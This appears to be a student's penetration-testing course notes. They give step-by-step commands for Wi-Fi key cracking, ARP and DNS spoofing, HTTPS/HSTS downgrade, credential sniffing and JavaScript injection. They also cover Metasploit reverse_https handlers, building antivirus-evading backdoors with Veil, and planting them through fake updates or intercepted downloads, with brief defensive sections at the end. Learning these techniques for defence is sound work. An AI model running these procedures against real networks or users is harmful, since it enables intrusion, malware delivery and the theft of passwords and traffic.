# NETWORK 

## MAC address
- Media Access Control
- unique for network device (wired or Ethernet card etc.)
- always the same for a device
- changing it increases anonymity, bypasses filters impersonates other devices
- of course, you can not change the physical address, you can just change the address in memory
- every packet has source and destination MAC address
- because all packets sent in the air, it is possible to capture packets even if we do not have the destination MAC

## ifconfig
- shows all devices that can connect to the network
- only connected devices have IP address

### ifconfig <network-interface> down/up
- disables/enables the network device

### ifconfig <network-interface> <attribute> <value>
- changes the given attribute of the network to value
- for MAC address, attribute = *hw ether* and set first two characters as *00*

## iwconfig
- shows all wireless interfaces
- change the *Mode* of the interface to *Monitor* to see all packets in the area of this wireless

### iwconfig <wireless-interface> <attribute> <value>
- for monitor mode, attribute = *mode* and value = *monitor*

## airmon-ng check kill
- kills any process that can interfere with wireless interface
- cuts the connection to internet

## airodump-ng <wireless-interface>
- in monitor mode, shows info about wireless networks around
- only shows 2.4 Ghz networks
- BSSID : MAC address
- PWR : signal power (higher is better)
- Beacons : broadcats the network's existence
- Data : number of data packets
- /s : number of data packets in last 10 seconds
- CH : the channel netowrk works on
- MB : max speed supported by the network
- ENC : encryption used by the network (OPN for open, no password)
- CIPHER : cipher used in the network
- AUTH : authentication used on the network
- ESSID : name of the network

### --band
- specifies bands for the networks searched
- *a* : 5 Ghz networks
- *abg* : both 2.4 and 5 Ghz networks

### --bssid
- sniffs data from only specified network by MAC address

### --channel
- give also channel number while sniffing data from specific network

- by giving these 2 as argument, clients connected to the wireless network can be seen
- Rate : speed
- Frames : captured packets
- Probe : if the device is still probing for network

### --write
- writes the sniffed data to the file
- appends *-01-* automatically
- use *.cap* in general
- the file contains all the data sent to and from the target network but they are encrypted by the router encryption

## WIFI Bands
- the frequency range that network can use to broadcast the signal
- most common : 2.4 Ghz and 5 Ghz

## wireshark
- program to open *.cap* files
- enlists all the data packets sniffed
- *Source* section shows the manufacturer of the device with the MAC address

## aireplay-ng --deauth <number> -a <router-MAC> -c <device-MAC> <wireless-interface>
- deauthentication attack
- disconnects the client with MAC address *device-MAC* from the network with MAC address *router-MAC*
- sends deauthenticaton packets to the both router and device
- do not forget to give the wireless adapter name
- wireless adapter should be in monitor mode
- use this while running *airodump-ng* to get better results
- <number> specifies how many deauth packets will be send so it will determine the disconnection time

## WEP Encryption
- stands for Wired Equivalent Privacy
- older from orther router encryptions and not safe
- uses the algorithm RC4
- the problem is not the algorithm, it is the implementation
- a keystream for the packet is created by adding unique 24-bit initialization vector and the network key
- the packet contains the hash and the vector, the key is already found in the router and device
- then the reciever can decrypt the data using the keystream
- 24-bits is not much so for a busy network, the same vector can appear in some different transactions
- so this means the keystream for them is the same
- from this info, it is possible to crack the key
- just capture a large number of packets (4Head) with *airodump-ng*
- analyze the captured vectors andcrack the key with *aircrack-ng*
- attack described above works only if the network is busy
- if the network is busy, we need to inject data packets to it to increase the nof data packets
- to do that we need to associate with the network (tell the network that we need to communicate with it, the network ignores other requests;
only communicates with connected clients)
- to associate, first use *airdump-ng* with *bssid, channel, write, interface* and keep it open or close
- then use *aireplay-ng* as given below
- then force the access point(AP) to generate new packets with new IVs(24-bit vectors) using *aireplay-ng*, ARP replay attack
- first wait for an *ARP* packet and capture it
- then retransmit it and this causes AP to generate a new packet with new IV
- repeat this until we have enough packets
- lastly, crack the key like it is a busy network
- while cracking, *airodump-ng* and *aireplay-ng* can still run

## aircrack-ng <cap-file>
- cracks the WEP encrypted router key
- first write the captured data packets to a file by using *airodump-ng*
- then give the *.cap* file as an argument to this command
- the result given in ASCI section is the key
- if there is no ASCI section, take the hex number with semicolons; it is the hex of the key
- remove semicolons and use the rest number as key

## aireplay-ng --fakeauth 0 -a <router-MAC> -h <adapter-MAC> <wireless-interface>
- fake authentication attack, associates with the network
- to find adapter MAC, use *ifconfig* and the MAC is the first 12 characters of the *unspec* field
- replace *-* with *:*
- adapter should be in monitor mode
- when activated, the wireless adapter should appear in *airodump-ng* because it is associated and can communicate with the network
- *AUTH* field also can be *OPN*

## aireplay-ng --arpreplay -b <router-MAC> -h <adapter-MAC> <wireless-interface>
- ARP replay attack (forcing to generate packets)
- similar procedures with the fake authentication attack
- enough to get around 45k packets

## WPA and WPA2 Encryption
- WPA uses *TKIP* and WPA2 uses *CCMP* encryption algorithms
- both of them are cracked in the same way
- *WPS* allows devices to connect the router without the key (for printer etc.)
- press WPS button on both device and the router to do it
- authentication is done with a 8-digit pin
- the number of possible passwords is therefore less than a secure a key
- so we exploit the feature, not the encryption
- to do this, WPS should be enabled on the network and it should be misconfigured which means it should use the normal pin
authentication; not push button authentication(PBC)
- in most new routers, WPS is disabled and PBC is enabled :( Sadge but check whether WPS is enabled in any case using *wash*
- after finding the network to connect, use *Reaver* like below to first to find the right pin for WPS by trying all pins
- this pin is used to compute the actual key, Reaver also shows it when terminates
- at the same time with reaver, associate with it like in WEP but use *--fakeauth 30* which means associate every 30 seconds

- if the WPS is disabled, we need to crack the actual encryption of WPA and WPA2
- the data packets contain no useful information, we need to capture handshake packects which are sent between the router and the
client connects to it
- to capture the packets first use in monitor mode *airodump-ng* just like in WEP on a specific network and write the packets into a file
- now we need to wait a client to connect to the network so that we can capture a handshake packet
- instead of just waiting, just do a deauthentication attack to a connected client for a short time and then it will connect automatically
again
- when the client connects again, the handshake appears at the top of the *airodump-ng* then we can quit
- handshake packets can not be used to find the key, it can be used to check if a password is valid or not
- so we need to create a *wordlist* file with passwords in it and we try them one by one
- we can download wordlists from internet but to generate one, use *crunch* (explained below)
- then first unpack the handshake packets to get useful information
- *MIC(Message Integrity Code)* checks whether the password is correct or not
- *aircrack-ng* separates the MIC in the handshake packet and takes a password from the wordlist
- it then combines other informations in the packet to generate a MIC with the password
- if the generated MIC is the same as the original, then the true password is found
- use *aircrack-ng* like below
- to speed up the process, run the attack on GPU instead of CPU if possible or pipe the result of *crunch* to *aircrack-ng*

## wash --interface <wireless-interface>
- lists all networks with WPS enabled
- adapter should be in monitor mode
- keeps running until you cancel it
- *Vendor* : hardware used in this network
- *Lck* : if WPS is locked or not (if locked, PepeHands)
- *WPS* : version
- *dBm* : signal strength
- *Ch* : channel

## reaver --bssid <router-MAC> --channel <ch> --interface <wireless-interface> -vvv --no-associate
- WPS pin attack
- download the older version if it does not work
- *-vvv* shows more info
- *--no-associate* tells reaver to not associate because we will do it manually, it has higher chance to fail when done automatically
- shows the cracked pin and network key when the process is done

## crunch <min> <max> <characters> -t <pattern> -o <file>
- wordlist generation
- min and max specifies min and max number of characters in the password
- characters specifies which characters are used in the password
- pattern specifies a clue to be used in the password (in example, the password starts with a, like regex)
- use *@* to use wildcard character in the pattern, but it represents only one character like *.*
- the generated passwords are written in the file
- there are much more options, use man to see them (-p is important)

## aircrack-ng <cap-file> -w <wordlist-file>
- wordlist attack
- use the *.cap* file generated from *airodump-ng*
- tests all passwords in the wordlist file one by one to find the correct one
- the program shows you the password if the attack is successful
- because the speed of this attack really depends on the processor and the wordlist size, search the internet sites where they have
huge wordlists and super computers so that by uploading the handshake packet file, it finds the true password faster

## IP Address
- stands for *Internet Protocol*
- the IP address of the network device can be found by using *ifconfig* like below
- the IP address of the router is the first address in the subnet
- if the device has IP : 192.168.0.25, the router should have 192.168.0.1

## ifconfig <wireless-interface>
- IP address is the field *inet addr*

## Information Gathering in Network
- use *NetDiscover* to map the network we connected to
- you can only gather info from the devices that connected to the same network with you
- use *NMap* to get much much more information, it is a huge tool
- it can show the running programs on a computer or the operating system
- *Zenmap* is a program to utilize Nmap terminal command in a graphical interface

## netdiscover -r <ip-range>
- gathering information about the network
- ip range should start with the router ip (X.X.X.1)
- the range from 1 to 254 can be specified by X.X.X.1/24
- this way the whole subnet ip is specified
- if done via the wireless adapter, the wired connection to the virtual machine must be disabled
- devices > network > connect network adapter uncheck

## Zenmap
- call by typing zenmap in the terminal
- into the target box, give an IP or a range of IPS
- *Ping scan* : very fast, just shows which IP addresses are used in the network by the devices and the manufacturer with MAC addresses
- *Quick scan* : also shows the open ports in the devices
- *Quick scan plus* : also shows the os, device type, and the program running
- Services section shows which devices use which service
- ports are so important because we decide how to hack the device by looking at their open ports

## MITM Attacks
- Man in the Middle Attacks
- they are the attacks that can be launched when we intercept the communication between devices
- *ARP Spoofing* : the hacker gets himself in the connection path of two devices, so the packets are sent to hacker and from there,
to the destination
- by spoofing, the hacker can see everything flowing including passwords and redirect or drop the packets
- this is possible because ARP is not secure
- ARP stands for *Address Resolution Protocol* and maps IP addresses to MAC addresses
- the communication inside a network is done by using MAC address
- a client wanting to connect to another client in the same network first does a ARP Request saying "Who has this IP?" (target IP)
- device having the target IP will send an ARP Respons telling "I have this IP and my MAC address is attached"
- so the source now has the target MAC to communicate with the device
- each computer has ARP table which holds corresponding MAC addresses to the IP addresses for the devices in the same network, it can
be seen by using *arp* like below
- this linking can be exploited by changing the MAC addresses
- when a target computer is selected, we tell the router that we have the IP address of the target computer so it associates our MAC with
that IP
- we also tell the target computer that we have the IP of the router so it updates its ARP table with IP of the router having our MAC
- this way, we become the man in the middle because all the data sent between the router and the target first comes to us and we forward them,
this attack is called ARP spoofing
- ARP is not secure because clients can get responses even if they did not sent requests
- the attack explained above sends responses to both router and target without them asking anything but they accept it anyway
- also the ARP Protocol does not verify these responses and does not check who sent it, it trusts the given data

- *arpspoof* is a tool to make us man in the middle, so we intercept the data flow and it can work on many os
- by default, the computer does not allow data packets to go through, so the request are rejected when the target wants to access
something
- to overcome this, we need to enable port forwarding, use the *echo* command below
- *bettercap* is a better tool for ARP spoofing and also sniffing data(username, password, etc.), bypassing HTTPS, DNS spoofing,
injecting code to loaded pages and more
- in websites using HTTP, the datas are sent as plain text so if we become the man in the middle; we can directly see this text and read it
- that is why HTTP is not secure
- in HTTPS, this problem is solved by adding an extra encryption layer by using *TLS(Transport Layer Security) or SSL(Secure Sockets Layer)*
- so we still become man in the middle but the datas we read are encrypted so we can not understand the content
- to bypass HTTPS, when we take requests from the target, we downgrade it to HTTP so when the router send response we can read it easily
using *bettercap* in the same way
- to do that, we need to change the folder *hstshijack* with an updated one, you can find it in the course resources and the command is given
in the section *net.sniff*
- some very famous websites use *HSTS*, which is more secure than HTTPS and can not be downgraded
- modern websites are hard-coded to load only a list of HSTS websites over HTTPS
- when the target computer is in a website with HSTS, that computer sends and accepts only HTTPS links so we can not get the request and responses
in HTTP from it anymore
- to overcome this, we should trick the target computer to think it is loading a different website
- see *hstshijack* module below to get to know some options
- HSTS can not be bypassed if the target HSTS website is loaded from another HSTS website(Google), so the solution is partial

## HTTP, HTTPS and HSTS
- stands for *Hypertext Transfer Protocol*, *Hypertext Transfer Protocol Secure* and *HTTP Strict Transport Security*
- in HSTS, for example, change *facebook.com* to *facebook.corn* xd or *twitter.com* to *twiter.com* xd
- in order this HSTS attack to work, the target website should not be loaded from a HSTS websites
- for example, the target should not load facebook from google, so bypassing HSTS is a partial solution

## arp -a
- shows the ARP table recorded in the computer

## arpspoof -i <network-interface> -t <target-IP> <router-IP>
## arpspoof -i <network-interface> -t <router-IP> <target-IP>
- allows you to intercept the connection between target and the router
- all packets between them will flow through us
- first one tells the target that we are the router
- second one tells the router that we are the target
- so the target changes the MAC address of the router to our MAC address
- similar for router

## echo 1 > /proc/sys/net/ipv4/ip_forward
- enables port forwarding

## bettercap -iface <network-interface> (optional) -caplet <.cap>
- starts the bettercap command prompt
- type *help* to see the modules
- type *help <module-name>* to get information about the module
- auto completion works with tab
- when we want to give bettercap a headstart by executing some commands, type all of the commands in a *.cap* and give it as an argument
- for example, when sniffing data by ARP spoofing, open a .cap file and type these:
	1. net.probe on
	2. set arp.spoof.fullduplex true
	3. set arp.spoof.targets <target-IP>
	4. arp.spoof on
	5. set net.sniff.local true (only if we want to capture HTTPS)
	6. net.sniff on
- to run a caplet in the bettercap terminal, directly type its name
- wildcards in the terminal can be used in bettercap, especially *

### <module-name> on
- starts the specific module
- only after setting all the parameters of the module, run this to start the attack

### set <module.parameter> <value>
- sets the attribute of the module to the value
- for example, *set arp.spoof.fullduplex true*

### net.probe on
- shows the clients connected to same network
- it automatically starts the module *net.recon* because this module sends probe request to all IPs and if they respond they all are taken
to a list by net.recon

### net.show
- when net.probe is already on, the discovered clients are shown in a table giving basic information about them like *airodump-ng*
- *gateway* speicifes the router
- *<network-interface>* specifies this computer

### arp.spoof
- arp spoofing with bettercap
- *arp.ban on* : cuts the connection of the target
- make sure *net.probe* and *net.recon* is running before starting this module
- after turning on this module, in the target machine, the MAC address of both the router and our computer should be the same and be equal
to the MAC address of our computer (check with ifconfig)

#### fullduplex
- both the target and the router are attacked and we become man in the middle
- default will only attack the target, so set the router also by using *arp.spoof.fullduplex true*

#### targets
- default is entire subnet
- give the IP address of the target

### net.sniff
- sniffs datas flowing through our computer when we are man in the middle, captures them and we can analyze it
- can be run without setting any parameter if HTTPS websites are not cared
- maybe can not capture datas in websites using *https*
- when browsing on the internet in the target computer, it shows urls with any images or files also loaded from the website
- also when logged in on a website in the target computer, the username and the password is shown directly
- by default, it will only capture datas in HTTP because those datas are sent as plain text so they are not secure
- to also capture datas in HTTPS, run the caplet *hstshijack/hstshijack* after turning on this module

### caplets.show
- shows all the *.cap* files in the system
- we should be able to locate *hstshijack* caplet here to downgrade HTTPS to HTTP

### hstshijack
- downgrades HTTPS to HTTP and transforms website links with HSTS to similar websites
- *facebook.com* -> *facebook.corn*

#### targets
- target websites using HSTS

#### replacements
- replace the targets with these ones
- write the replacements in the order of the targets

## DNS Spoofing
- it is a server that converts domain names(google.com) to the IP of the server hosting this website
- notice that there is no *www* at the start of the domain name
- when an url given to a web browser, the request goes to a DNS server and it responds with the IP of that url
- then the browser will load the website from this IP
- when we are man in the middle, target sends request to a website with the domain name; but as respond from DNS server, we can return any IP
we want so we can load any website, inject evil, hijack updates etc.
- to start the DNS spoofing, first start the bettercap as if we were bypassing HTTPS; use the arpspoof.cap file
- then downgrade HTTPS to HTTP for to be sure it will work
- then use the *dns.spoof* module below
- the attack will work in 1-2 minute
- this attack will not work on websites using HSTS

### dns.spoof
- replies the DNS messages with spoofed responses
- set *all* to true
- set *address* and *domains* and then turn on the module

#### address
- IP address that we return to the target computer
- the default is the IP address of our current running network interface
- so do not modify it if you want to locate to our IP address

#### all
- makes the module reply to every DNS request sent

#### domains
- the domain names of the websites(facebook.com) to be redirected to the IP we give
- seperate websites with commas
- give the target url but also the subdomain containing it (\*.facebook.com)

## Website from our web server
- Kali comes with a built in web server
- type *service apache2 start* to run it
- now it acts as a normal website which can be reached when the IP address of our computer is given to web browser as url
- the files uploaded to this website can be found in */var/www/html*
- *index.html* is the loaded by default as gui

## Injecting Javascript code
- because the data flows through our computer when we are man in the middle, if th router has responded with a webpage with HTML and Javascript
code, we can change it or add to it our own code
- HTML code only organizes buttons, tables or similar things in user interface
- but Javascript is a powerful programming language allowing us to do much and this code is executed by the target browser
- this can be used to replace links and images, insert HTML elements, hook target browser to exploitation frameworks etc.
- to inject the code, first prepare a *.js* file for the code to inject
- then go to the *hstshijack.cap* in */usr/share/bettercap/caplets/hstshijack/hstshijack.cap*
- the line with *set hstshijack.payloads* command specifies what js code to inject when loading specified domains
- *\*:* means inject the specified code to all load webpages, then give the full path of the js code we want to insert
- separate injections by comma
- preparation is now complete, just do the same procedure now with the data sniffing and hstshajicak folder
- launch *bettercap* with the interface and the *arpspoof.cap* file and then run *hstshijack/hstshijack* in it

## Wireshark
- network protocol analyzer
- shows what is happening and which user is doing what in the network
- loads all the flowing data packets and allows to filter them
- it also allows to search the packets
- it is not originally a hacking tool it is just showing what is flowing on your network interface, it does not show what is happening in other
devices
- you can open a already prepared file with captured data information from the menu
- in the main screen, you see the wireless inferfaces in the computer
- the lines are graphing the data traffic in them
- when we become the man in the middle, we can also see the data traffic in the target's computer
- go to the *capture options* on the top left to select the interface we want the analyze the data packets on and start the program there
- now anything flowing on our interface will appear here, if we are the man in the middle, we see the target's datas too
- to see the datas going to target computer, run the *bettercap* in the terminal and run the spoofing attack there with *arpspoof.cap*
- also start the module *hstshijack* to downgrade HTTPS to HTTP because packets with HTTPS are encrypted and we can not read them
- when the analyzing starts, packets using different protocol comes in different colors
- black ones with the protocol *TCP* are the packets with some issues
- after recording some packets and stopping, use filter section at top to display useful packets
- write *http* to see the http packets we can see the informations on
- double click a packet to see detailed information
- whenever a data is sent to a website, the destination port will always be *80*
- the useful data about packet can be found in the last section with the title of the protocol
- *GET* means a get request is sent
- *Host* is the host website
- in the lines when displaying packets, at the start, an incoming arrow means request and an outgoing one means response
- to see the all the coming and going data between request and response and the full content of the packet, right click a packet and *Follow
> HTTP Stream*
- to store the sniffed data and analyze it later on wireshark, write *set net.sniff.output <file-path>* after the line *set net.sniff.local true*
- then you can anaylze it after with opening in wireshark from File section
- you can use *Ctrl+f* to search packets or information in the packets, select it on the left from the search bar

### Capturing usernames and passwords
- login forms are sent in *POST* packets, so to capture a packet doing logins, look for POST packets
- then double click the POST packet to see the website the login form is sent
- the username and password can be found in the *HTML Form URL Encoded* section
- not all POST packets mean there is a username and password in them
- chances of finding username and password is higher in packets with info *POST /users/login...*
- seeing the username and passwords in wireshark is easier and sometimes bettercap can not show them directly, it can fail to filter them

## Fake Access Point
- another method of becoming man in the middle
- we use our computer to create a wifi network that has internet access
- people come and try to access our network to connect to the internet
- when they get the access, we are automatically the man in the middle because we are actually the router
- we need a network interface to connect to the internet and a wireless adapter that is cspsblr of broadcasting the wifi signal
- our computer will be seen like a normal network

## Mana-toolkit
- runs rouge access point attacks
- automatically configures and creates fake access point, sniffs data, bypasses HTTPS etc.
- before starting the kit, first configure its settings stored in the file */etc/mana-toolkit/hostapd-mana.conf*

### start-noupstream.sh
- starts fake AP without internet access

### start-nat-simple.sh
- starts fake AP with internet access
- use this then run bettercap to sniff data and bypass HTTPS yourself

### start-nat-full.sh
- starts fake AP with internet access and sniffs data, bypasses HTTPS
- fails a lot so do not prefer this

- in Kali linux, we use *eth0*(wired connection of VM which uses the connection of our computer) interface to access the internet
- we use *wlan0*(wireless adapter) interface to broadcast signal but adapter should be in *managed* mode and shoudl not be connectod to the
internet

## Detecting ARP Spoofing attack
- if we write *arp -a* to list all the devices in the network, we can see all the MAC addresses associated with IP addresses
- if there is a MAC address corresponding with more than one IP address, including router, then we are ARP spoofed gg eazy
- the attacker's MAC and IP can be easily determined because that MAC and the IP that is not belonging to router are the attacker's addresses
- but this is not convenient because we have to check everytime
- *XArp* is a program to detect the ARP spoofing attacks and it alerts when we are targeted with this attack, also giving the attacker's IP and
MAC address
- in arp table, some entries are static and some are dynamic
- if we change the entry of the router IP and MAC address to static, then it can not be changed and the ARP spoofing attack will fail
- in wireshark, in the preferences in the ARP section, open the detect ARP storm option
- when the activities in the network is analyzed, if somebody is doing a ARP spoof attack, then we can understand it because there is some much
broadcast packets asking "who has this IP, my MAC is this"
- the person with that MAC address is probably doing an ARP spoof attack

## Preventing MITM attacks
- can use this methods when we understand we are being attacked or we connect to a network that we have no control(public networks like eduroam)
- the key to solution is encryptting our traffic so that even if somebody intercepts it, that person can not read them
- the solution involves using HTTPS everywhere plugin or using a VPN
- *HTTPS everywhere* is a plugin for browsers that applies the HSTS protocol to the all websites using HTTPS
- so even if HTTPS is downgraded to HTTP, the system will not accept it and it will be upgraded again to HTTPS
- but this method does not work for websites using HTTP and even if hacker can not access our usernames and password, he can still see which
websites we are accessing by ARP spoofing attack and can still run a DNS spoofing attack

## VPN
- stands for *Virtual Private Network*
- the complete solution to prevent MITM attacks is using a VPN, most of them uses the same technology so the provider does not matter
- VPN establihes an encrypted tunnel between our computer and the VPN server we connect
- this way, the attacker can not read anything(even urls) with ARP spoofing attack
- when you try to connect to google.com, your request will pass through a number of hubs but you still connect directly to google.com
- but if the protocols does not use a proper encryption, then your data might be at risk
- when you connect to a VPN server in a certain country, you create an encrypted tunnel between you and the server
- when you try to connect to google.com using VPN, then your data is encrypted and sent to server which can be able to decrypt and read this
- but if there is an interception while you are sending the data, the intercepter can only see the encrypted version, so he can not read
- then VPN server takes your request sends it to google.com and again sends you the response
- the benefits of VPN can be listed as
	1. extra layer of encryption
	2. more privacy and anonymity
	3. bypass censorship because the controlling mechanism can not see what you are doing or where are you connecting, all they see is you
are connecting a server in another country
	4. protection from hackers Sadge :(
- use a reputable VPN or one you can actually trust because by default the VPN server is already the man in the middle
- it decrypts the data you sent privately to them to allow you to access somewhere but this means it can see your datas and private
informations
- so do not use a free VPN or do not use your private datas(username, password) if you are using it because maintaining a VPN is actually
expensive and costly
- also make sure to keep no logs
- you should actually still use *HTTPS everywhere* when using VPN to increase the security and add one more layer of encryption
- because *TLS* encryption by HTTPS is done between you and the website you are connecting, the VPN does one more encryption and then in the server
decrypts it but because of HTTPS, the server still can not read your data, it can just send it to the website and send you the encrypted response
- this way, your data will always be encrypted until it reaches the target(website), it does not matter how many times it is encrypted

## Gaining Access to Computers
- EVERY ELECTRONIC DEVICE AROUND IS A COMPUTER, some of them are just simpler
- even webservers and websites can be thought as a computer
- so penetration on every device uses the same methods
- Two main sides to attack them : Server side and Client side

### Server Side attacks
- we do not need user to do anything
- getting the target IP address is enough
- mostly work on webservers and devices that user does not interfere with the system, devices that runs automatically after configured
- we use the operating system and applications running on the system to gain access to that computer

### Client Side attacks
- requires user interaction(updating an app, installing an image, opening a link etc.)
- information gathering is crucial here because we use social engineering to make the target run the trap

## Server Side
- we need an IP address
- can be run against normal computers also but is generally run against servers because we rely on IP address
- if the target is not connected to the same network with us, then the target is hiding behind the router so if we try to gather information,
most of the data we get is about the router, not the computer
- on the other hand, the IP address of a server is fixed and this attack can be run directly
- very simple if the target is in the same network and has a real IP address
- if the target is a domain, then a single ping will return its IP address
- use *ping* like below to check if the communication between us and the target is fine

## ping <IP-address> or <domain-name>
- sends to and gets packets from the computer with the given IP
- if a domain name is given, we can get the IP address by using this command
- used to check if the communication between us and the target is okay
- if it is working fine, then we can be sure that the server side attacks will work

### Information Gathering
- we get information about what operating system is running, which programs are currently open and which ports are available
- once we get access to these services, we try default passwords of the system to get full access
- services may be misconfigured so they can be exploited
- they might even have backdoor
- we search for code execution vulnerabilities such as remote buffer overflows
- use *zenmap* with *intense scan* to get information about the device, remember to scan the device in zenmap all we need is the IP
- intense scan can show all the installed applications on the device
- we can even give the IP address of a website or webserver to zenmap it will show the running activities if we have the permission

### Exploitation
- when we find the open ports with intense scan, we should now check ports one by one to see whether it has a misconfiguration or backdoor in them
- to do this, just google the *service* and *version* of the port and learn how to get through them, there is no general way of doing this
- all programs seen in open ports are hacked differently so we should make research about this
- zenmap also shows some vulnerabilities if it can finds, so read the informations below the open ports
- especially look for default passwords, misconfigurations, backdoors, code execution vulnerabilities like buffe overflow

#### Metasploit
- an execution development and execution tool
- can also be used for penetration tests
- contains huge number of exploits, additionally you can create your own exploits
- the specific commands that should be used to carry out a secific execution could be given in the websites
- the general usage is pretty much the same when directly exploiting, first type *use <exploit-name>*
- then *show options* to see what to configure and use *set* to prepare the attack
- after, *show targets* and *set TARGET <target-id>* to set the direct target
- lastly, *exploit* to run
- if we exploit a code execution vulnerability, we can not gain access directly
- we can only inject small piece of code to the system that will run when the vulnerable code is executed
- these pieces of code is called as *payload*
- type *show payloads* to see possible payloads that can be inserted
- *bind* payloads open a port on the target computer and we connect to that port
- *reverse* payloads open a port on our computer and the target connects our computer
- reverse payloads allows us to bypass firewalls because with bind, if the target has a firewall we can not be successful but with reverse, we can
disable our firewall to let the target connect
- when we select payload, *set PAYLOAD <payload-name>*

##### msfconsole
- launches the Metasploit

##### help

##### show <something>
- shows available exploits, payloads, auxiliaries or options
- *show options* is useful
- *show targets* is also critical because you must choose a target from there before running exploit
- *show payloads*

##### use <something>
- when the available exploits or others are shown, use them with this command

##### set <option> <value>
- sets the option of a module to the given value
- the option is the name of the option when the options are listed with *show options*
- *set TARGET <target-id>* to set the target, do not forget this
- *set PAYLOAD <payload-name>* to select which payload to inser
- *set PAYLOAD <payload-name>* to select which payload to insert

##### exploit
- runs the exploit with the configurations made earlier

#### Nexpose
- it is a vulnerability management framework
- allows us to discover, assess and act on discovered vulnerabilities
- also tells us wheter the discovered vulnerability is exploitable or not
- these vulnerabilities and exploits are used in larger scale than in Metasploit
- a report can be created at the end of the scan to be inspected by other people
- before running it, make sure to turn off our database because Nexpose uses its own database
- turnoff our database by typing *service postgresql stog*
- run it by executing the *nsc.sh* file in */opt/rapid7/nexpose/nsc*
- to log in nexpose, find the section with *https://localhost* and go there from the web browser

## Client Side
- use when server side attacks fail(can not ping the target because he is hiding behind a router, not in the same network etc)
- requires the target to do something(open a link or a file, install an update etc)
- so therefore information gathering is much more important in this case
- we do not only learn the target computer's os or applicarions but also try to get some information about the person(friends, websites they use)

## Backdoor
- is a file that gives us full control over the machine that it gets executed on
- backdoors can be caught by antivrus programs, so our goal is to generate backdoor that are undetectable by antivirus programs

### Veil
- a framework to generate undetectable backdoors
- it automatically lists available commands to us
- update is important because we bypass antiviruses and they also get updated
- to generate undetectable backdoor, use the tool *Evasion* from the menu comes with *list* command
- *Ordnance* generates payloads used by Evasion
- payload is the piece of code that contains our evil code, includes the stuff that we want to do on the target computer, *15* is recommended
- a payload consists of 3 parts :
	1. the programming language the payload is wrapped in
	2. the type of the code that will be executed on the target computer(for example, *meterpreter* allows to payload run in the memory like
a normal system process so it is not easy to detect and does not leave much footprints
	3. the method that will be used to establish the connection(for example, *rev_https* stands for reverse connection on https
- what we mean by reverse is we are not connecting to the target computer but the target computer connects to us when the backdoor is active
- this allows us to bypass antivirus programs because it will be seen like the target computer is connecting to a website
- websites generally use the port number *80* or *8080*, so if we reveal our port as if it is *80* or *8080*, then even if a program analyzes the
connection to our computer, it will be seen like a normal interaction
- there is no problem in the connection even if the target is hiding behind a router because by reverse connection, it is connecting to us
- in the attacks, set the *LHOST* to our IP, *LPORT* to 80 or 8080, 80 may be used by another server, so 8080 is preferable
- by setting these, we bypass all antiviruses except *AVG*

#### use
- allows us to select the tool, payload, in general the helper we want to achieve our goal
- so after listing the avaiable options, *use <id>* to select the specific one and then veil lists the new available commands that can be used now

#### set
- sets the required options that is listed
- use like *set LHOST <ip>*

## Antivirus programs
- they have very large database of signatures that corresponds to files that contain harmful codes
- so they compare the signature of our file to the all files in the database
- if there is a match, then the program flags our file as virus or malware
- if there is no match, gg eazy wp
- to bypass this, we modify our code as much as possible to make it more unique and the antivirus program will not recognize it
- veil is already doing for us but it can not bypass *AVG*
- to make the code look a little more different, set some options to random values which will not have much effect on the code
- for example, PROCESSORS->1, SLEEP->3 etc
- then type *generate* to create payload, veil will shows the created payload path and name
- you can check if it will be detected by antivirus programs by *checkvt* command but it is not %100 accurate
- also the website where the payload is checked by default *virustotal.com* shares the results with antivirus programs so it will be less
effective in future
- use *nodistribute.com* to test it, the scan will show which antivirus programs we bypass
- sometimes, the unnecessary options we set affect the results, so try changing them until you get all clean result
- antivirus programs update their databases so same payload might get detected in the future, so update veil regularly and always check the scan
results in nodistribute.com

## Listening to Incoming Connections
- by setting payload to reverse, the target is connecting to our computer
- for this to work, we need to open a port in our computer
- we set our port to 8080, so we should open port with number 8080
- do this in Metasploit by typing *use exploit/multi/handler*
- then set payload by typing *set PAYLOAD windows/meterpreter/reverse_https*, in fact the last 2 parts of the payload should be the same as the one
we selected in veil
- after this set LHOST to our IP and LPORT to 8080, actually the number we set LPORT to in veil
- then *exploit* to run it, now Metasploit will wait for connections and when the target opens backdoor, it will connect to us and Metasploit will
allow us to hack
- before applying the backdoor to somewhere, put it in the website of kali(same file in the kali where we changed *index.html*, *var/www/html*)
- first, make a directory in that path and put backdoors in that directory(*.exe* files)
- do not forget to start the webserver of kali by typing *service apache2 start*
- in the target machine, go to our IP address in web brower and to go to our directory, just type *<IP>/<folder*>

## Spoofing Software Updates
- a backdoor delivery method which a program says an update is available, and when the user allows the update, it will actually downloads and runs
the backdoor
- the only limitation of this method is that we need to be the man in the middle, no matter how
- programs have specific domains to check for updates
- when a program wants the update, it sends a request to the DNS server
- the DNS server answers with the IP of the update server then the user sends a direct request to update server to look for updates
- when we are man in the middle, when we get a update request, we respond with the IP of a hacker server running *evilgrade*
- *evilgrade* responds to user saying "there is an update yeah bro" and sends the IP of the backdoor
- then if the user installs it, we control everything
- also while being the man in the middle, we need to run a DNS spoofing attack to redirect the target to our trap
- do not forget to listen to incoming connections to gain access when the backdoor is executed

### evilgrade
- fakes the user by pretending there is an app update
- very similar program to Metasploit
- use the module *dap* to fake Win10 update
- the *agent* option in the module is the backdoor to be used
- first select the module, then configure options, and *start* to run
- we need to be the man in the middle to get a request from the user
- also in bettercap, run the DNS spoofing attack with setting the *domains* in *dns.spoof* to *update.speedbit.com*, actually the website
appearing in the options as *VirtualHost*
- then, we need to listen to incoming connections using Metasploit to prepare ourselves for backdoor executing 

#### show modules
- shows all programs that we can hijack their updates

#### configure <module-name>
- sets the used module to module name

#### show options
- shows the options that can be set in the module
- the option *agent* is the backdoor file to be used, set it
- the *endsite* option is the website that is to be loaded when the update is successful

#### set <option-name> <value>
- set the option to a specific value, just like in Metasploit

#### start
- runs the fake update, waiting for the user to request the update and it will serve the prepared fake one

## Backdooring exe Downloads
- we wait for the target to download an executable and we backdoor as it is being downloaded
- when that executable is run, the target gets the file he is expecting but at the same time, we get the full access on the computer
- again, we need to be the man in the middle to carry out this attack
- to do the attack, we use *backdoor factory proxy*, in short *bdfproxy*
- configure the *.cfg* file by changing the proxy from *regular* to *transparent* and the IP addresses in the devices listed to our IP
- could not fucking install it :( Sadge
- when using bettercap to intercept data flow, we nned to direct them to bdfproxy, do this by typing below
- then listen to incoming connections by a special rule by typing *msfconsole --resource <path-to-bdfproxy>/bdfproxy_msf_resource.rc*
- when the target opens the downloaded exe file, in Metasploit there should be a session opened
- list sessions by typing *sessions -l*
- then get into it by typing *sessions -i <session-id>*
